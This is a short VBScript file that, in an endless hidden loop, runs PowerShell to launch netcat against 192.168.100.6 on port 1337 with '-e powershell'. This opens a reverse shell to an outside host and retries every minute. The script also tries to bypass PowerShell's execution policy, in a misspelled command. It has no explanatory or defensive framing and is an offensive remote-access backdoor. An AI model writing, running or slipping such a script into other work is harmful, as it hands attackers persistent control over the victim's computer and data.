Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	ncShell.Run "powershell C:\Windows\System32\nc.exe 192.168.100.6 1337 -e powershell;Set-ExcutionPolicy Bypass", 0, true
	WScript.Sleep(60000)
loop
